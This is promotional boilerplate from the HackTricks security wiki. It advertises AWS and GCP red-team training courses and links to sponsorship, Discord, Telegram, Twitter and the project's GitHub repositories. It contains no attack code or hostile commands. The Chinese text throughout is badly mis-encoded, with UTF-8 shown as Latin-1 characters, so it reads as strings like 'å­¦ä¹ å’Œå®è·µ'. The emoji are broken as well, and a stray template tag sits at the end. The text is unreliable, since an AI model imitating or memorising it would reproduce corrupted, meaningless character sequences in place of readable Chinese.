å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
